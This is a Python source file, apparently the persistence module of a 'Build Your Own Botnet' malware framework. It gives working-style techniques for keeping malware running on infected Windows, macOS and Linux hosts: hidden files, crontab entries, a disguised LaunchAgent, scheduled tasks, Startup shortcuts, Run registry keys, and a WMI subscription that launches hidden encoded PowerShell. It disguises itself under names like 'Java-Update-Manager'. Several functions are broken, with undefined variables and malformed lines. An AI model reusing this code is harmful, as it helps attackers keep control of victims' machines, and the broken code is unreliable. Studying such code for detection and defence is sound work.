#!/usr/bin/python
# -*- coding: utf-8 -*-
'Persistence (Build Your Own Botnet)'

# standard libarary
import os
import sys
import imp
import urllib
import random
import subprocess

# packages
if sys.platform == 'win32':
    import _winreg

# utilities
import core.util as util

# globals
packages = ['_winreg'] if sys.platform == 'win32' else []
platforms = ['win32','linux2','darwin']
results = {}
usage = 'persistence [method] <add/remove>'
description = """
Establish persistence on the client host machine 
with multiple methods to ensure redundancy
"""

# templates
__Template_wmi = """$filter = ([wmiclass]"\\\\.\\root\\subscription:__EventFilter").CreateInstance()
$filter.QueryLanguage = "WQL"
$filter.Query = "Select * from __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA [STARTUP]"
$filter.Name = "[NAME]"
$filter.EventNamespace = 'root\\cimv2'
$result = $filter.Put()
$filterPath = $result.Path
$consumer = ([wmiclass]"\\\\.\\root\\subscription:CommandLineEventConsumer").CreateInstance()
$consumer.Name = '[NAME]'
$consumer.CommandLineTemplate = '[COMMAND_LINE]'
$consumer.ExecutablePath = ""
$consumer.WorkingDirectory = "C:\\Windows\\System32"
$result = $consumer.Put()
$consumerPath = $result.Path
$bind = ([wmiclass]"\\\\.\\root\\subscription:__FilterToConsumerBinding").CreateInstance()
$bind.Filter = $filterPath
$bind.Consumer = $consumerPath
$result = $bind.Put()
$bindPath = $result.Path"""

__Template_plist = """#!/bin/bash
echo '<plist version="1.0">
<dict>
<key>Label</key>
<string>__LABEL__</string>
<key>ProgramArguments</key>
<array>
<string>/usr/bin/python</string>
<string>__FILE__</string>
</array>
<key>RunAtLoad</key>
<true/>
<key>StartInterval</key>
<integer>180</integer>
<key>AbandonProcessGroup</key>
<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.apples.__LABEL__.plist
chmod 600 ~/Library/LaunchAgents/com.apples.__LABEL__.plist
launchctl load ~/Library/LaunchAgents/com.apples.__LABEL__.plist
exit"""

# main
class Method():
    """
    Persistence Method (Build Your Own Botnet)

    """
    def __init__(self, name, platforms=['win32','linux2','darwin']):
        self.name = name
        self.result = None
        self.established = False
        self.platforms = platforms
        [util.__logger__.warn("required method '_{}_{}' not found".format(_, self.name)) for _ in ('add','remove') if '_{}_{}'.format(_, self.name) not in globals()]

    def add(self):
        """ 
        Attempt to establish persistence using the given method

        """
        if sys.platform in self.platforms:
            if not self.established:
                self.established, self.result = globals()['_add_{}'.format(self.name)]()
        else:
            raise OSError("Persistence method '{}' not compatible with {} platforms".format(self.name, sys.platform))

    def remove(self):
        """ 
        Remove an established persistence method from the host machine

        """
        if sys.platform in self.platforms:
            if self.established:
                self.established, self.result = globals()['_remove_{}'.format(self.name)]()
        else:
            raise OSError("Persistence method '{}' not compatible with {} platforms".format(self.name, sys.platform))


def _add_hidden_file(value=None):
    try:
        value = sys.argv[0]
        if value and os.path.isfile(value):
            if os.name is 'nt':
                path = value
                hide = subprocess.call('attrib +h {}'.format(path), shell=True) == 0
            else:
                dirname, basename = os.path.split(value)
                path = os.path.join(dirname, '.' + basename)
                hide = subprocess.call('mv {} {}'.format(value, path), shell=True) == 0
            return (True if hide else False, path)
        else:
            util.log("File '{}' not found".format(value))
    except Exception as e:
        util.log(e)
    return (False, None)


def _add_crontab_job(value=None, minutes=10, name='flashplayer'):
    try:
        if sys.platform == 'linux2':
            value = sys.argv[0]
            if value and os.path.isfile(value):
                if not methods['crontab_job'].established:
                    user = os.getenv('USERNAME', os.getenv('NAME'))
                    task = "0 */6 * * * {} {}".format(60/minutes, user, path)
                    with open('/etc/crontab', 'r') as fp:
                        data = fp.read()
                    if task not in data:
                        with file('/etc/crontab', 'a') as fd:
                            fd.write('\n' + task + '\n')
                    return (True, path)
                else:
                    return (True, path)
    except Exception as e:
        util.log("{} error: {}".format(_add_crontab_job.func_name, str(e)))
    return (False, None)


def _add_launch_agent(value=None, name='com.apple.update.manager'):
    try:
        if sys.platform == 'darwin':
            if not value:
                if len(sys.argv):
                    value = sys.argv[0]
                elif '__file__' in globals():
                    value = globals().get('__file__')
                else:
                    raise ValueError('No target file selected')
            if value and os.path.isfile(value):
                label   = name
                if not os.path.exists('/var/tmp'):
                    os.makedirs('/var/tmp')
                fpath   = '/var/tmp/.{}.sh'.format(name)
                bash    = globals()['__Template_plist'].replace('__LABEL__', label).replace('__FILE__', value)
                with file(fpath, 'w') as fileobj:
                    fileobj.write(bash)
                bin_sh  = bytes().join(subprocess.Popen('/bin/sh {}'.format(fpath), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                time.sleep(1)
                launch_agent= '~/Library/LaunchAgents/{}.plist'.format(label)
                if os.path.isfile(launch_agent):
                    os.remove(fpath)
                    return (True, launch_agent)
                else:
                    util.log('File {} not found'.format(launch_agent))
    except Exception as e2:
        util.log('Error: {}'.format(str(e2)))
    return (False, None)


def _add_scheduled_task(value=None, name='Java-Update-Manager'):
    try:
        if os.name == 'nt' and not methods['scheduled_task'].established:
            value = sys.argv[0]
            name  = util.variable(random.randint(6,11))
            if value and os.path.isfile(value):
                result  = subprocess.check_output('SCHTASKS /CREATE /TN {} /TR {} /SC hourly /F'.format(name, value), shell=True)
                if 'SUCCESS' in result:
                    return (True, result.replace('"', ''))
    except Exception as e:
        util.log('Add scheduled task error: {}'.format(str(e)))
    return (False, None)


def _add_startup_file(value=None, name='Java-Update-Manager'):
    try:
        if os.name == 'nt' and not methods['startup_file'].established:
            value = sys.argv[0]
            if value and os.path.isfile(value):
                appdata = os.path.expandvars("%AppData%")
                startup_dir = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
                if not os.path.exists(startup_dir):
                    os.makedirs(startup_dir)
                startup_file = os.path.join(startup_dir, '%s.eu.url' % name)
                content = '\n[InternetShortcut]\nURL=file:///%s\n' % value
                if not os.path.exists(startup_file) or content != open(startup_file, 'r').read():
                    with file(startup_file, 'w') as fp:
                        fp.write(content)
                return (True, startup_file)
    except Exception as e:
        util.log('{} error: {}'.format(_add_startup_file.func_name, str(e)))
    return (False, None)


def _add_registry_key(value=None, name='Java-Update-Manager'):
    try:
        if os.name == 'nt' and not methods['registry_key'].established:
            value = sys.argv[0]
            if value and os.path.isfile(value):
                try:
                    util.registry_key(r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", name, value)
                    return (True, name)
                except Exception as e:
                    util.log('{} error: {}'.format(_add_registry_key.func_name, str(e)))
    except Exception as e:
        util.log('{} error: {}'.format(_add_registry_key.func_name, str(e)))
    return (False, None)


def _add_powershell_wmi(command=None, name='Java-Update-Manager'):
    try:
        if os.name == 'nt' and not methods['powershell_wmi'].established:
            cmd_line  = ""
            value = sys.argv[0]
            if value and os.path.isfile(value):
                cmd_line = 'start /b /min {}'.format(value)
            elif command:
                cmd_line = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(base64.b64encode(bytes(command).encode('UTF-16LE')))
            if cmd_line:
                startup = "'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
		globals()['__Template_wmi'].replace('[STARTUP]', startup).replace('[COMMAND_LINE]', cmd_line).replace('[NAME]', name)
                util.powershell(powershell)
                code = "Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='%s'\"" % name
                result = util.powershell(code)
                if name in result:
                    return (True, result)
    except Exception as e:
        util.log('{} error: {}'.format(_add_powershell_wmi.func_name, str(e)))
    return (False, None)


def _remove_scheduled_task():
    if methods['scheduled_task'].established:
        value = methods['scheduled_task'].result
        try:
             if subprocess.call('SCHTASKS /DELETE /TN {} /F'.format(value), shell=True) == 0:
                 return (False, None)
        except: pass
    return (methods['scheduled_task'].established, methods['scheduled_task'].result)


def _remove_hidden_file():
    try:
        if methods['hidden_file'].established:
            filename = methods['hidden_file'].result
            if os.path.isfile(filename):
                try:
                    unhide  = 'attrib -h {}'.format(filename) if os.name is 'nt' else 'mv {} {}'.format(filename, os.path.join(os.path.dirname(filename), os.path.basename(filename).strip('.')))
                    if subprocess.call(unhide, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
                        return (False, None)
                except Exception as e1:
                    util.log('{} error: {}'.format(_remove_hidden_file.func_name, str(e1)))
    except Exception as e2:
        util.log('{} error: {}'.format(_remove_hidden_file.func_name, str(e2)))
    return (methods['hidden_file'].established, methods['hidden_file'].result)


def _remove_crontab_job(value=None, name='flashplayer'):
    try:
        if sys.platform == 'linux2' and methods['crontab_job'].established:
            with open('/etc/crontab','r') as fp:
                lines = [i.rstrip() for i in fp.readlines()]
                for line in lines:
                    if name in line:
                        _ = lines.pop(line, None)
            with open('/etc/crontab', 'a+') as fp:
                fp.write('\n'.join(lines))
        return (False, None)
    except Exception as e:
        util.log('{} error: {}'.format(_remove_crontab_job.func_name, str(e)))
    return (methods['hidden_file'].established, methods['hidden_file'].result)


def _remove_launch_agent(value=None, name='com.apple.update.manager'):
    try:
        if methods['launch_agent'].established:
            launch_agent = persistence['launch_agent'].result
            if os.path.isfile(launch_agent):
                util.delete(launch_agent)
                return (False, None)
    except Exception as e:
        util.log("{} error: {}".format(_remove_launch_agent.func_name, str(e)))
    return (methods['launch_agent'].established, methods['launch_agent'].result)


def _remove_powershell_wmi(value=None, name='Java-Update-Manager'):
    try:
        if methods['powershell_wmi'].established:
            try:
                code = r"""
                Get-WmiObject __eventFilter -namespace root\subscription -filter "name='[NAME]'",  Remove-WmiObject
                Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='[NAME]'" ,  Remove-WmiObject
                Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription ,  Where-Object { $_.filter -match '[NAME]'} ,  Remove-WmiObject""".replace('[NAME]', name)
                result = util.powershell(code)
                if not result:
                    return (False, None)
            except: pass
        return (methods['powershell_wmi'].established, methods['powershell_wmi'].result)
    except Exception as e:
        util.log('{} error: {}'.format(_add_powershell_wmi.func_name, str(e)))
    return (methods['powershell_wmi'].established, methods['powershell_wmi'].result)
    

def _remove_registry_key(value=None, name='Java-Update-Manager'):
    try:
        if methods['registry_key'].established:
            value = methods['registry_key'].result
            try:
                key = OpenKey(_winreg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0, _winreg.KEY_ALL_ACCESS)
                _winreg.DeleteValue(key, name)
                _winreg.CloseKey(key)
                return (False, None)
            except: pass
        return (methods['registry_key'].established, methods['registry_key'].result)
    except Exception as e:
        util.log(str(e))


def _remove_startup_file():
    try:
        if methods['startup_file'].established:
            value = methods['startup_file'].result
            if value and os.path.isfile(value):
                if os.name != 'nt':
                    return (False, None)
                appdata      = os.path.expandvars("%AppData%")
                startup_dir  = os.path.join(appdata, r'Microsoft\Windows\Start Menu\Programs\Startup')
                startup_file = os.path.join(startup_dir, value) + '.eu.url'
                if os.path.exists(startup_file):
                    util.delete(startup_file)
        return (False, None)
    except Exception as e:
        util.log('{} error: {}'.format(_remove_startup_file.func_name, str(e)))

hidden_file    = Method('hidden_file', platforms=['win32','linux2','darwin'])
scheduled_task = Method('scheduled_task', platforms=['win32'])
registry_key   = Method('registry_key',   platforms=['win32'])
startup_file   = Method('startup_file',   platforms=['win32'])
launch_agent   = Method('launch_agent',   platforms=['darwin'])
crontab_job    = Method('crontab_job',    platforms=['linux2'])
powershell_wmi = Method('powershell_wmi', platforms=['win32'])


def methods():
    """
    Persistence methods as dictionary (JSON) object of key-value pairs

    Ex. {"method": <Method-object at 0x098fce>, ...}

    `Method`
    :attr method add:          run the method
    :attr method remove:       remove the method
    :attr str name:            name of the method
    :attr bool established:    True/False if established
    :attr str result:          method result output

    """
    return {method: globals()[method] for method in globals() if isinstance(globals()[method], Method)}

def results():
    """ 
    Results of completed persistence methods as dictionary (JSON) object of key-value pairs

    Ex. {"method": "result", ...}

    """
    return {name: method.result for name, method in methods().items() if method.established}

def run():
    """
    Attempt to establish persistence with every method

    """
    for name, method in methods().items():
        if sys.platform in method.platforms:
            try:
                method.add()
            except Exception as e:
                util.log(e)
    return results()
    
def abort():
    """
    Remove all established persistence methods

    """
    for name, method in methods().items():
        if sys.platform in method.platforms:
            try:
                method.remove()
            except Exception as e:
                util.log(e)

